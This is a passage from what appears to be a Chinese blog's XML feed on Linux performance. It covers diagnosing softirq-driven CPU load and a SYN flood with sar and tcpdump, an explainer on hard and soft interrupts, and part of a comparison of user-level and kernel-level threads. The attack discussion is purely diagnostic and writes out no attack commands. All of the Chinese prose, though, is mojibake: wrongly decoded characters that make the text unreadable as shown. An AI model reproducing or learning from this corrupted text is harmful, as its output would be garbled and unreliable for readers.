TIMERï¼ˆå®šæ—¶ä¸­æ–­ï¼‰ã€NET_RXï¼ˆç½‘ç»œæ¥æ”¶ï¼‰ã€SCHEDï¼ˆå†…æ ¸è°ƒåº¦ï¼‰ã€RCUï¼ˆRCU é”ï¼‰ç­‰è¿™å‡ ä¸ªè½¯ä¸­æ–­éƒ½åœ¨ä¸åœå˜åŒ–ã€‚<br>å…¶ä¸­ï¼ŒNET_RXï¼Œä¹Ÿå°±æ˜¯ç½‘ç»œæ•°æ®åŒ…æ¥æ”¶è½¯ä¸­æ–­çš„å˜åŒ–é€Ÿç‡æœ€å¿«ã€‚è€Œå…¶ä»–å‡ ç§ç±»å‹çš„è½¯ä¸­æ–­ï¼Œæ˜¯ä¿è¯ Linux è°ƒåº¦ã€æ—¶é’Ÿå’Œä¸´ç•ŒåŒºä¿æŠ¤è¿™äº›æ­£å¸¸å·¥ä½œæ‰€å¿…éœ€çš„ï¼Œæ‰€ä»¥å®ƒä»¬æœ‰ä¸€å®šçš„å˜åŒ–å€’æ˜¯æ­£å¸¸çš„ã€‚<br>sar å¯ä»¥ç”¨æ¥æŸ¥çœ‹ç³»ç»Ÿçš„ç½‘ç»œæ”¶å‘æƒ…å†µï¼Œè¿˜æœ‰ä¸€ä¸ªå¥½å¤„æ˜¯ï¼Œä¸ä»…å¯ä»¥è§‚å¯Ÿç½‘ç»œæ”¶å‘çš„ååé‡ï¼ˆBPSï¼Œæ¯ç§’æ”¶å‘çš„å­—èŠ‚æ•°ï¼‰ï¼Œè¿˜å¯ä»¥è§‚å¯Ÿç½‘ç»œæ”¶å‘çš„ PPSï¼Œå³æ¯ç§’æ”¶å‘çš„ç½‘ç»œå¸§æ•°ã€‚<br>è¿è¡Œ sar å‘½ä»¤ï¼Œå¹¶æ·»åŠ  -n DEV å‚æ•°æ˜¾ç¤ºç½‘ç»œæ”¶å‘çš„æŠ¥å‘Šï¼š</p><p><img src="https://snowgo.top/medias/medias/%E7%B3%BB%E7%BB%9F%E7%9A%84%E8%BD%AF%E4%B8%AD%E6%96%AD%E8%87%B4CPU%E4%BD%BF%E7%94%A8%E7%8E%87%E5%8D%87%E9%AB%98%E5%BA%94%E5%AF%B9%E7%AD%96%E7%95%A5/5.png"><br> sar çš„è¾“å‡ºï¼š</p><ul><li>ç¬¬ä¸€åˆ—ï¼šè¡¨ç¤ºæŠ¥å‘Šçš„æ—¶é—´ã€‚</li><li>ç¬¬äºŒåˆ—ï¼šIFACE è¡¨ç¤ºç½‘å¡ã€‚</li><li>ç¬¬ä¸‰ã€å››åˆ—ï¼šrxpck/s å’Œ txpck/s åˆ†åˆ«è¡¨ç¤ºæ¯ç§’æ¥æ”¶ã€å‘é€çš„ç½‘ç»œå¸§æ•°ï¼Œä¹Ÿå°±æ˜¯ PPSã€‚</li><li>ç¬¬äº”ã€å…­åˆ—ï¼šrxkB/s å’Œ txkB/s åˆ†åˆ«è¡¨ç¤ºæ¯ç§’æ¥æ”¶ã€å‘é€çš„åƒå­—èŠ‚æ•°ï¼Œä¹Ÿå°±æ˜¯ BPSã€‚</li><li>åé¢çš„å…¶ä»–å‚æ•°åŸºæœ¬æ¥è¿‘ 0ï¼Œæ˜¾ç„¶è·Ÿä»Šå¤©çš„é—®é¢˜æ²¡æœ‰ç›´æ¥å…³ç³»ï¼Œä½ å¯ä»¥å…ˆå¿½ç•¥æ‰ã€‚</li></ul><p>æˆ‘ä»¬å…·ä½“æ¥çœ‹è¾“å‡ºçš„å†…å®¹ï¼Œä½ å¯ä»¥å‘ç°ï¼š</p><ul><li>å¯¹ç½‘å¡ eth0 æ¥è¯´ï¼Œæ¯ç§’æ¥æ”¶çš„ç½‘ç»œå¸§æ•°æ¯”è¾ƒå¤§ï¼Œè¾¾åˆ°äº† 12607ï¼Œè€Œå‘é€çš„ç½‘ç»œå¸§æ•°åˆ™æ¯”è¾ƒå°ï¼Œåªæœ‰ 6304ï¼›æ¯ç§’æ¥æ”¶çš„åƒå­—èŠ‚æ•°åªæœ‰ 664 KBï¼Œè€Œå‘é€çš„åƒå­—èŠ‚æ•°æ›´å°ï¼Œåªæœ‰ 358 KBã€‚</li><li>docker0 å’Œ veth9f6bbcd çš„æ•°æ®è·Ÿ eth0 åŸºæœ¬ä¸€è‡´ï¼Œåªæ˜¯å‘é€å’Œæ¥æ”¶ç›¸åï¼Œå‘é€çš„æ•°æ®è¾ƒå¤§è€Œæ¥æ”¶çš„æ•°æ®è¾ƒå°ã€‚è¿™æ˜¯ Linux å†…éƒ¨ç½‘æ¡¥è½¬å‘å¯¼è‡´çš„ï¼Œä½ æš‚ä¸”ä¸ç”¨æ·±ç©¶ï¼Œåªè¦çŸ¥é“è¿™æ˜¯ç³»ç»ŸæŠŠ eth0 æ”¶åˆ°çš„åŒ…è½¬å‘ç»™ Nginx æœåŠ¡å³å¯ã€‚å…·ä½“å·¥ä½œåŸç†ï¼Œæˆ‘ä¼šåœ¨åé¢çš„ç½‘ç»œéƒ¨åˆ†è¯¦ç»†ä»‹ç»ã€‚</li></ul><p>é‡ç‚¹æ¥çœ‹ eth0 ï¼šæ¥æ”¶çš„ PPS æ¯”è¾ƒå¤§ï¼Œè¾¾åˆ° 12607ï¼Œè€Œæ¥æ”¶çš„ BPS å´å¾ˆå°ï¼Œåªæœ‰ 664 KBã€‚ç›´è§‚æ¥çœ‹ç½‘ç»œå¸§åº”è¯¥éƒ½æ˜¯æ¯”è¾ƒå°çš„ï¼Œæˆ‘ä»¬ç¨å¾®è®¡ç®—ä¸€ä¸‹ï¼Œ664*1024/12607 = 54 å­—èŠ‚ï¼Œè¯´æ˜å¹³å‡æ¯ä¸ªç½‘ç»œå¸§åªæœ‰ 54 å­—èŠ‚ï¼Œè¿™æ˜¾ç„¶æ˜¯å¾ˆå°çš„ç½‘ç»œå¸§ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬é€šå¸¸æ‰€è¯´çš„å°åŒ…é—®é¢˜ã€‚<br>æ‰¾å‡ºç½‘ç»œå¸§æ˜¯ä»å“ªå‘è¿‡æ¥çš„ï¼š<br>ä½¿ç”¨ tcpdump æŠ“å– eth0 ä¸Šçš„åŒ…å°±å¯ä»¥äº†ã€‚æˆ‘ä»¬äº‹å…ˆå·²ç»çŸ¥é“ï¼Œ Nginx ç›‘å¬åœ¨ 80 ç«¯å£ï¼Œå®ƒæ‰€æä¾›çš„ HTTP æœåŠ¡æ˜¯åŸºäº TCP åè®®çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æŒ‡å®š TCP åè®®å’Œ 80 ç«¯å£ç²¾ç¡®æŠ“åŒ…ã€‚<br>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬åœ¨ç¬¬ä¸€ä¸ªç»ˆç«¯ä¸­è¿è¡Œ tcpdump å‘½ä»¤ï¼Œé€šè¿‡ -i eth0 é€‰é¡¹æŒ‡å®šç½‘å¡ eth0ï¼Œå¹¶é€šè¿‡ tcp port 80 é€‰é¡¹æŒ‡å®š TCP åè®®çš„ 80 ç«¯å£ï¼š<br><img src="https://snowgo.top/medias/medias/%E7%B3%BB%E7%BB%9F%E7%9A%84%E8%BD%AF%E4%B8%AD%E6%96%AD%E8%87%B4CPU%E4%BD%BF%E7%94%A8%E7%8E%87%E5%8D%87%E9%AB%98%E5%BA%94%E5%AF%B9%E7%AD%96%E7%95%A5/6.png"><br>ä» tcpdump çš„è¾“å‡ºä¸­ï¼Œä½ å¯ä»¥å‘ç°</p><ul><li>192.168.0.2.18238 &gt; 192.168.0.30.80 ï¼Œè¡¨ç¤ºç½‘ç»œå¸§ä» 192.168.0.2 çš„ 18238 ç«¯å£å‘é€åˆ° 192.168.0.30 çš„ 80 ç«¯å£ï¼Œä¹Ÿå°±æ˜¯ä»è¿è¡Œ hping3 æœºå™¨çš„ 18238 ç«¯å£å‘é€ç½‘ç»œå¸§ï¼Œç›®çš„ä¸º Nginx æ‰€åœ¨æœºå™¨çš„ 80 ç«¯å£ã€‚</li><li>Flags [S] åˆ™è¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ª SYN åŒ…ã€‚</li></ul><p>å†åŠ ä¸Šå‰é¢ç”¨ sar å‘ç°çš„ï¼Œ PPS è¶…è¿‡ 12000 çš„ç°è±¡ï¼Œç°åœ¨æˆ‘ä»¬å¯ä»¥ç¡®è®¤ï¼Œè¿™å°±æ˜¯ä» 192.168.0.2 è¿™ä¸ªåœ°å€å‘é€è¿‡æ¥çš„ SYN FLOOD æ”»å‡»ã€‚</p><p>SYN FLOOD é—®é¢˜æœ€ç®€å•çš„è§£å†³æ–¹æ³•ï¼Œå°±æ˜¯ä»äº¤æ¢æœºæˆ–è€…ç¡¬ä»¶é˜²ç«å¢™ä¸­å°æ‰æ¥æº IPï¼Œè¿™æ · SYN FLOOD ç½‘ç»œå¸§å°±ä¸ä¼šå‘é€åˆ°æœåŠ¡å™¨ä¸­ã€‚</p><p>è½¯ä¸­æ–­ CPU ä½¿ç”¨ç‡ï¼ˆsoftirqï¼‰å‡é«˜æ˜¯ä¸€ç§å¾ˆå¸¸è§çš„æ€§èƒ½é—®é¢˜ã€‚è™½ç„¶è½¯ä¸­æ–­çš„ç±»å‹å¾ˆå¤šï¼Œä½†å®é™…ç”Ÿäº§ä¸­ï¼Œæˆ‘ä»¬é‡åˆ°çš„æ€§èƒ½ç“¶é¢ˆå¤§å¤šæ˜¯ç½‘ç»œæ”¶å‘ç±»å‹çš„è½¯ä¸­æ–­ï¼Œ<strong>ç‰¹åˆ«æ˜¯ç½‘ç»œæ¥æ”¶çš„è½¯ä¸­æ–­</strong>ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> é—®é¢˜å’ŒæŠ€å·§ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ€ä¹ˆç†è§£Linuxè½¯ä¸­æ–­ï¼Ÿ</title>
      <link href="/2022/06/26/%E6%80%8E%E4%B9%88%E7%90%86%E8%A7%A3Linux%E8%BD%AF%E4%B8%AD%E6%96%AD%EF%BC%9F/"/>
      <url>/2022/06/26/%E6%80%8E%E4%B9%88%E7%90%86%E8%A7%A3Linux%E8%BD%AF%E4%B8%AD%E6%96%AD%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<h2 id="ä»€ä¹ˆæ˜¯ä¸­æ–­"><a href="#ä»€ä¹ˆæ˜¯ä¸­æ–­" class="headerlink" title="ä»€ä¹ˆæ˜¯ä¸­æ–­"></a>ä»€ä¹ˆæ˜¯ä¸­æ–­</h2><p>ä¸­æ–­æ˜¯ç³»ç»Ÿç”¨æ¥å“åº”ç¡¬ä»¶è®¾å¤‡è¯·æ±‚çš„ä¸€ç§æœºåˆ¶ï¼Œå®ƒä¼šæ‰“æ–­è¿›ç¨‹çš„æ­£å¸¸è°ƒåº¦å’Œæ‰§è¡Œï¼Œç„¶åè°ƒç”¨å†…æ ¸ä¸­çš„ä¸­æ–­å¤„ç†ç¨‹åºæ¥å“åº”è®¾å¤‡çš„è¯·æ±‚ã€‚</p><h3 id="ä¸ºä»€ä¹ˆæœ‰ä¸­æ–­"><a href="#ä¸ºä»€ä¹ˆæœ‰ä¸­æ–­" class="headerlink" title="ä¸ºä»€ä¹ˆæœ‰ä¸­æ–­"></a>ä¸ºä»€ä¹ˆæœ‰ä¸­æ–­</h3><p>æ¯”å¦‚è¯´ä½ è®¢äº†ä¸€ä»½å¤–å–ï¼Œä½†æ˜¯ä¸ç¡®å®šå¤–å–ä»€ä¹ˆæ—¶å€™é€åˆ°ï¼Œä¹Ÿæ²¡æœ‰åˆ«çš„æ–¹æ³•äº†è§£å¤–å–çš„è¿›åº¦ï¼Œä½†æ˜¯ï¼Œé…é€å‘˜é€å¤–å–æ˜¯ä¸ç­‰äººçš„ï¼Œåˆ°äº†ä½ è¿™å„¿æ²¡äººå–çš„è¯ï¼Œå°±ç›´æ¥èµ°äººäº†ã€‚æ‰€ä»¥ä½ åªèƒ½è‹¦è‹¦ç­‰ç€ï¼Œæ—¶ä¸æ—¶å»é—¨å£çœ‹çœ‹å¤–å–é€åˆ°æ²¡ï¼Œè€Œä¸èƒ½å¹²å…¶ä»–äº‹æƒ…ã€‚<br>ä¸è¿‡å‘¢ï¼Œå¦‚æœåœ¨è®¢å¤–å–çš„æ—¶å€™ï¼Œä½ å°±è·Ÿé…é€å‘˜çº¦å®šå¥½ï¼Œè®©ä»–é€åˆ°åç»™ä½ æ‰“ä¸ªç”µè¯ï¼Œé‚£ä½ å°±ä¸ç”¨è‹¦è‹¦ç­‰å¾…äº†ï¼Œå°±å¯ä»¥å»å¿™åˆ«çš„äº‹æƒ…ï¼Œç›´åˆ°ç”µè¯ä¸€å“ï¼Œæ¥ç”µè¯ã€å–å¤–å–å°±å¯ä»¥äº†ã€‚<br>è¿™é‡Œçš„â€œæ‰“ç”µè¯â€ï¼Œå…¶å®å°±æ˜¯ä¸€ä¸ªä¸­æ–­ã€‚æ²¡æ¥åˆ°ç”µè¯çš„æ—¶å€™ï¼Œä½ å¯ä»¥åšå…¶ä»–çš„äº‹æƒ…ï¼›åªæœ‰æ¥åˆ°äº†ç”µè¯ï¼ˆä¹Ÿå°±æ˜¯å‘ç”Ÿä¸­æ–­ï¼‰ï¼Œä½ æ‰è¦è¿›è¡Œå¦ä¸€ä¸ªåŠ¨ä½œï¼šå–å¤–å–ã€‚<br>è¿™ä¸ªä¾‹å­ä½ å°±å¯ä»¥å‘ç°ï¼Œ<strong>ä¸­æ–­å…¶å®æ˜¯ä¸€ç§å¼‚æ­¥çš„äº‹ä»¶å¤„ç†æœºåˆ¶ï¼Œå¯ä»¥æé«˜ç³»ç»Ÿçš„å¹¶å‘å¤„ç†èƒ½åŠ›</strong>ã€‚<br>ç”±äºä¸­æ–­å¤„ç†ç¨‹åºä¼šæ‰“æ–­å…¶ä»–è¿›ç¨‹çš„è¿è¡Œï¼Œæ‰€ä»¥ï¼Œ<strong>ä¸ºäº†å‡å°‘å¯¹æ­£å¸¸è¿›ç¨‹è¿è¡Œè°ƒåº¦çš„å½±å“ï¼Œä¸­æ–­å¤„ç†ç¨‹åºå°±éœ€è¦å°½å¯èƒ½å¿«åœ°è¿è¡Œ</strong>ã€‚å¦‚æœä¸­æ–­æœ¬èº«è¦åšçš„äº‹æƒ…ä¸å¤šï¼Œé‚£ä¹ˆå¤„ç†èµ·æ¥ä¹Ÿä¸ä¼šæœ‰å¤ªå¤§é—®é¢˜ï¼›ä½†å¦‚æœä¸­æ–­è¦å¤„ç†çš„äº‹æƒ…å¾ˆå¤šï¼Œä¸­æ–­æœåŠ¡ç¨‹åºå°±æœ‰å¯èƒ½è¦è¿è¡Œå¾ˆé•¿æ—¶é—´ã€‚<br>ç‰¹åˆ«æ˜¯ï¼Œä¸­æ–­å¤„ç†ç¨‹åºåœ¨å“åº”ä¸­æ–­æ—¶ï¼Œè¿˜ä¼šä¸´æ—¶å…³é—­ä¸­æ–­ã€‚è¿™å°±ä¼šå¯¼è‡´ä¸Šä¸€æ¬¡ä¸­æ–­å¤„ç†å®Œæˆä¹‹å‰ï¼Œå…¶ä»–ä¸­æ–­éƒ½ä¸èƒ½å“åº”ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸­æ–­æœ‰å¯èƒ½ä¼šä¸¢å¤±ã€‚</p><h2 id="è½¯ä¸­æ–­"><a href="#è½¯ä¸­æ–­" class="headerlink" title="è½¯ä¸­æ–­"></a>è½¯ä¸­æ–­</h2><p>ä¸ºäº†è§£å†³ä¸­æ–­å¤„ç†ç¨‹åºæ‰§è¡Œè¿‡é•¿å’Œä¸­æ–­ä¸¢å¤±çš„é—®é¢˜ï¼ŒLinux å°†ä¸­æ–­å¤„ç†è¿‡ç¨‹åˆ†æˆäº†ä¸¤ä¸ªé˜¶æ®µï¼Œä¹Ÿå°±æ˜¯<strong>ä¸ŠåŠéƒ¨å’Œä¸‹åŠéƒ¨</strong>ï¼š</p><ul><li><strong>ä¸ŠåŠéƒ¨ç”¨æ¥å¿«é€Ÿå¤„ç†ä¸­æ–­</strong>ï¼Œå®ƒåœ¨ä¸­æ–­ç¦æ­¢æ¨¡å¼ä¸‹è¿è¡Œï¼Œä¸»è¦å¤„ç†è·Ÿç¡¬ä»¶ç´§å¯†ç›¸å…³çš„æˆ–æ—¶é—´æ•æ„Ÿçš„å·¥ä½œã€‚</li><li><strong>ä¸‹åŠéƒ¨ç”¨æ¥å»¶è¿Ÿå¤„ç†ä¸ŠåŠéƒ¨æœªå®Œæˆçš„å·¥ä½œï¼Œé€šå¸¸ä»¥å†…æ ¸çº¿ç¨‹çš„æ–¹å¼è¿è¡Œ</strong>ã€‚</li></ul><p>è¿™ä¸¤ä¸ªé˜¶æ®µä½ ä¹Ÿå¯ä»¥è¿™æ ·ç†è§£ï¼š</p><ul><li>ä¸ŠåŠéƒ¨ç›´æ¥å¤„ç†ç¡¬ä»¶è¯·æ±‚ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å¸¸è¯´çš„ç¡¬ä¸­æ–­ï¼Œç‰¹ç‚¹æ˜¯å¿«é€Ÿæ‰§è¡Œï¼›</li><li>è€Œä¸‹åŠéƒ¨åˆ™æ˜¯ç”±å†…æ ¸è§¦å‘ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å¸¸è¯´çš„è½¯ä¸­æ–­ï¼Œç‰¹ç‚¹æ˜¯å»¶è¿Ÿæ‰§è¡Œã€‚</li></ul><p>ä¸ŠåŠéƒ¨ä¼šæ‰“æ–­ CPU æ­£åœ¨æ‰§è¡Œçš„ä»»åŠ¡ï¼Œç„¶åç«‹å³æ‰§è¡Œä¸­æ–­å¤„ç†ç¨‹åºã€‚è€Œä¸‹åŠéƒ¨ä»¥å†…æ ¸çº¿ç¨‹çš„æ–¹å¼æ‰§è¡Œï¼Œå¹¶ä¸”æ¯ä¸ª CPU éƒ½å¯¹åº”ä¸€ä¸ªè½¯ä¸­æ–­å†…æ ¸çº¿ç¨‹ã€‚</p><h2 id="æŸ¥çœ‹è½¯ä¸­æ–­å’Œå†…æ ¸çº¿ç¨‹"><a href="#æŸ¥çœ‹è½¯ä¸­æ–­å’Œå†…æ ¸çº¿ç¨‹" class="headerlink" title="æŸ¥çœ‹è½¯ä¸­æ–­å’Œå†…æ ¸çº¿ç¨‹"></a>æŸ¥çœ‹è½¯ä¸­æ–­å’Œå†…æ ¸çº¿ç¨‹</h2><p>ä¸çŸ¥é“ä½ è¿˜è®°ä¸è®°å¾—ï¼Œå‰é¢æåˆ°è¿‡çš„ proc æ–‡ä»¶ç³»ç»Ÿã€‚å®ƒæ˜¯ä¸€ç§å†…æ ¸ç©ºé—´å’Œç”¨æˆ·ç©ºé—´è¿›è¡Œé€šä¿¡çš„æœºåˆ¶ï¼Œå¯ä»¥ç”¨æ¥æŸ¥çœ‹å†…æ ¸çš„æ•°æ®ç»“æ„ï¼Œæˆ–è€…ç”¨æ¥åŠ¨æ€ä¿®æ”¹å†…æ ¸çš„é…ç½®ã€‚å…¶ä¸­ï¼š</p><ul><li>/proc/softirqs æä¾›äº†è½¯ä¸­æ–­çš„è¿è¡Œæƒ…å†µï¼›</li><li>/proc/interrupts æä¾›äº†ç¡¬ä¸­æ–­çš„è¿è¡Œæƒ…å†µã€‚</li></ul><p>è¿è¡Œä¸‹é¢çš„å‘½ä»¤ï¼ŒæŸ¥çœ‹ /proc/softirqs æ–‡ä»¶çš„å†…å®¹ï¼Œä½ å°±å¯ä»¥çœ‹åˆ°å„ç§ç±»å‹è½¯ä¸­æ–­åœ¨ä¸åŒ CPU ä¸Šçš„ç´¯ç§¯è¿è¡Œæ¬¡æ•°ï¼š<br><img src="https://snowgo.top/medias/medias/%E6%80%8E%E4%B9%88%E7%90%86%E8%A7%A3Linux%E8%BD%AF%E4%B8%AD%E6%96%AD%EF%BC%9F/0.png"><br>è¦ç‰¹åˆ«æ³¨æ„ä»¥ä¸‹è¿™ä¸¤ç‚¹ï¼š</p><ul><li>ç¬¬ä¸€ï¼Œè¦æ³¨æ„è½¯ä¸­æ–­çš„ç±»å‹ï¼Œä¹Ÿå°±æ˜¯è¿™ä¸ªç•Œé¢ä¸­ç¬¬ä¸€åˆ—çš„å†…å®¹ã€‚ä»ç¬¬ä¸€åˆ—ä½ å¯ä»¥çœ‹åˆ°ï¼Œè½¯ä¸­æ–­åŒ…æ‹¬äº† 10 ä¸ªç±»åˆ«ï¼Œåˆ†åˆ«å¯¹åº”ä¸åŒçš„å·¥ä½œç±»å‹ã€‚æ¯”å¦‚ NET_RX è¡¨ç¤ºç½‘ç»œæ¥æ”¶ä¸­æ–­ï¼Œè€Œ NET_TX è¡¨ç¤ºç½‘ç»œå‘é€ä¸­æ–­ã€‚</li><li>ç¬¬äºŒï¼Œè¦æ³¨æ„åŒä¸€ç§è½¯ä¸­æ–­åœ¨ä¸åŒ CPU ä¸Šçš„åˆ†å¸ƒæƒ…å†µï¼Œä¹Ÿå°±æ˜¯åŒä¸€è¡Œçš„å†…å®¹ã€‚æ­£å¸¸æƒ…å†µä¸‹ï¼ŒåŒä¸€ç§ä¸­æ–­åœ¨ä¸åŒ CPU ä¸Šçš„ç´¯ç§¯æ¬¡æ•°åº”è¯¥å·®ä¸å¤šã€‚æ¯”å¦‚è¿™ä¸ªç•Œé¢ä¸­ï¼ŒNET_RX åœ¨ CPU0 å’Œ CPU1 ä¸Šçš„ä¸­æ–­æ¬¡æ•°åŸºæœ¬æ˜¯åŒä¸€ä¸ªæ•°é‡çº§ï¼Œç›¸å·®ä¸å¤§ã€‚</li></ul><p>è½¯ä¸­æ–­å®é™…ä¸Šæ˜¯ä»¥å†…æ ¸çº¿ç¨‹çš„æ–¹å¼è¿è¡Œçš„ï¼Œæ¯ä¸ª CPU éƒ½å¯¹åº”ä¸€ä¸ªè½¯ä¸­æ–­å†…æ ¸çº¿ç¨‹ï¼Œè¿™ä¸ªè½¯ä¸­æ–­å†…æ ¸çº¿ç¨‹å°±å«åš ksoftirqd/CPU ç¼–å·ã€‚ç”¨psæŸ¥çœ‹è¿™äº›çº¿ç¨‹çš„è¿è¡ŒçŠ¶å†µï¼š<br><img src="https://snowgo.top/medias/medias/%E6%80%8E%E4%B9%88%E7%90%86%E8%A7%A3Linux%E8%BD%AF%E4%B8%AD%E6%96%AD%EF%BC%9F/1.png"><br>æ³¨æ„ï¼Œè¿™äº›çº¿ç¨‹çš„åå­—å¤–é¢éƒ½æœ‰ä¸­æ‹¬å·ï¼Œè¿™è¯´æ˜ ps æ— æ³•è·å–å®ƒä»¬çš„å‘½ä»¤è¡Œå‚æ•°ï¼ˆcmlineï¼‰ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œps çš„è¾“å‡ºä¸­ï¼Œåå­—æ‹¬åœ¨ä¸­æ‹¬å·é‡Œçš„ï¼Œä¸€èˆ¬éƒ½æ˜¯å†…æ ¸çº¿ç¨‹ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> é—®é¢˜å’ŒæŠ€å·§ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç”¨æˆ·çº§çº¿ç¨‹å’Œå†…æ ¸çº§çº¿ç¨‹çš„åŒºåˆ«</title>
      <link href="/2022/06/26/%E7%94%A8%E6%88%B7%E7%BA%A7%E7%BA%BF%E7%A8%8B%E5%92%8C%E5%86%85%E6%A0%B8%E7%BA%A7%E7%BA%BF%E7%A8%8B%E7%9A%84%E5%8C%BA%E5%88%AB/"/>
      <url>/2022/06/26/%E7%94%A8%E6%88%B7%E7%BA%A7%E7%BA%BF%E7%A8%8B%E5%92%8C%E5%86%85%E6%A0%B8%E7%BA%A7%E7%BA%BF%E7%A8%8B%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
      
        <content type="html"><![CDATA[<h2 id="åŒºåˆ«"><a href="#åŒºåˆ«" class="headerlink" title="åŒºåˆ«"></a>åŒºåˆ«</h2><ol><li>å†…æ ¸æ”¯æŒçº¿ç¨‹æ˜¯OSå†…æ ¸å¯æ„ŸçŸ¥çš„ï¼Œè€Œç”¨æˆ·çº§çº¿ç¨‹æ˜¯OSå†…æ ¸ä¸å¯æ„ŸçŸ¥çš„ã€‚</li><li>ç”¨æˆ·çº§çº¿ç¨‹çš„åˆ›å»ºã€æ’¤æ¶ˆå’Œè°ƒåº¦ä¸éœ€è¦OSå†…æ ¸çš„æ”¯æŒï¼Œæ˜¯åœ¨è¯­è¨€ï¼ˆå¦‚Javaï¼‰è¿™ä¸€çº§å¤„ç†çš„ï¼›è€Œå†…æ ¸æ”¯æŒçº¿ç¨‹çš„åˆ›å»ºã€æ’¤æ¶ˆå’Œè°ƒåº¦éƒ½éœ€OSå†…æ ¸æä¾›æ”¯æŒã€‚</li><li>ç”¨æˆ·çº§çº¿ç¨‹æ‰§è¡Œç³»ç»Ÿè°ƒç”¨æŒ‡ä»¤æ—¶å°†å¯¼è‡´å…¶æ‰€å±è¿›ç¨‹è¢«ä¸­æ–­ï¼Œè€Œå†…æ ¸çº¿ç¨‹æ‰§è¡Œç³»ç»Ÿè°ƒç”¨æŒ‡ä»¤æ—¶ï¼Œåªå¯¼è‡´è¯¥çº¿ç¨‹è¢«ä¸­æ–­ã€‚</li><li>åœ¨åªæœ‰ç”¨æˆ·çº§çº¿ç¨‹çš„ç³»ç»Ÿå†…ï¼ŒCPUè°ƒåº¦è¿˜æ˜¯ä»¥è¿›ç¨‹ä¸ºå•ä½ï¼Œå¤„äºè¿è¡ŒçŠ¶æ€çš„è¿›ç¨‹ä¸­çš„å¤šä¸ªçº¿ç¨‹ï¼Œç”±ç”¨æˆ·ç¨‹åºæ§åˆ¶çº¿ç¨‹çš„è½®æ¢è¿è¡Œï¼›åœ¨æœ‰å†…æ ¸æ”¯æŒçº¿ç¨‹çš„ç³»ç»Ÿå†…ï¼ŒCPUè°ƒåº¦åˆ™ä»¥çº¿ç¨‹ä¸ºå•ä½ï¼Œç”±OSçš„çº¿ç¨‹è°ƒåº¦ç¨‹åºè´Ÿè´£çº¿ç¨‹çš„è°ƒåº¦ã€‚</li><li>ç”¨æˆ·çº§çº¿ç¨‹çš„ç¨‹åºå®ä½“æ˜¯è¿è¡Œåœ¨ç”¨æˆ·æ€ä¸‹çš„ç¨‹åºï¼Œè€Œå†…æ ¸æ”¯æŒçº¿ç¨‹çš„ç¨‹åºå®ä½“åˆ™æ˜¯å¯ä»¥è¿è¡Œåœ¨ä»»ä½•çŠ¶æ€ä¸‹çš„ç¨‹åºã€‚</li></ol><h2 id="ä¼˜ç¼ºç‚¹"><a href="#ä¼˜ç¼ºç‚¹" class="headerlink" title="ä¼˜ç¼ºç‚¹"></a>ä¼˜ç¼ºç‚¹</h2><h3 id="å†…æ ¸çº¿ç¨‹çš„ä¼˜ç‚¹ï¼š"><a href="#å†…æ ¸çº¿ç¨‹çš„ä¼˜ç‚¹ï¼š" class="headerlink" title="å†…æ ¸çº¿ç¨‹çš„ä¼˜ç‚¹ï¼š"></a>å†…æ ¸çº¿ç¨‹çš„ä¼˜ç‚¹ï¼š</h3><p>å½“æœ‰å¤šä¸ªå¤„ç†æœºæ—¶ï¼Œä¸€ä¸ªè¿›ç¨‹çš„å¤šä¸ªçº¿ç¨‹å¯ä»¥åŒæ—¶æ‰§è¡Œã€‚ </p><h3 id="å†…æ ¸çº¿ç¨‹çš„ç¼ºç‚¹ï¼š"><a href="#å†…æ ¸çº¿ç¨‹çš„ç¼ºç‚¹ï¼š" class="headerlink" title="å†…æ ¸çº¿ç¨‹çš„ç¼ºç‚¹ï¼š"></a>å†…æ ¸çº¿ç¨‹çš„ç¼ºç‚¹ï¼š</h3><p>ç”±å†…æ ¸è¿›è¡Œè°ƒåº¦ã€‚ </p><h3 id="ç”¨æˆ·çº¿ç¨‹çš„ä¼˜ç‚¹"><a href="#ç”¨æˆ·çº¿ç¨‹çš„ä¼˜ç‚¹" class="headerlink" title="ç”¨æˆ·çº¿ç¨‹çš„ä¼˜ç‚¹"></a>ç”¨æˆ·çº¿ç¨‹çš„ä¼˜ç‚¹</h3><ol><li>çº¿ç¨‹çš„è°ƒåº¦ä¸éœ€è¦å†…æ ¸ç›´æ¥å‚ä¸ï¼Œæ§åˆ¶ç®€å•ã€‚ </li><li>å¯ä»¥åœ¨ä¸æ”¯æŒçº¿ç¨‹çš„æ“ä½œç³»ç»Ÿä¸­å®ç°ã€‚</li><li>åˆ›å»ºå’Œé”€æ¯çº¿ç¨‹ã€çº¿ç¨‹åˆ‡æ¢ä»£ä»·ç­‰çº¿ç¨‹ç®¡ç†çš„ä»£ä»·æ¯”å†…æ ¸çº¿ç¨‹å°‘å¾—å¤šã€‚ </li><li>å…è®¸æ¯ä¸ªè¿›ç¨‹å®šåˆ¶è‡ªå·±çš„è°ƒåº¦ç®—æ³•ï¼Œçº¿ç¨‹ç®¡ç†æ¯”è¾ƒçµæ´»ã€‚è¿™å°±æ˜¯å¿…é¡»è‡ªå·±å†™ç®¡ç†ç¨‹åºï¼Œä¸å†…æ ¸çº¿ç¨‹çš„åŒºåˆ« </li><li>çº¿ç¨‹èƒ½å¤Ÿåˆ©ç”¨çš„è¡¨ç©ºé—´å’Œå †æ ˆç©ºé—´æ¯”å†…æ ¸çº§çº¿ç¨‹å¤šã€‚ 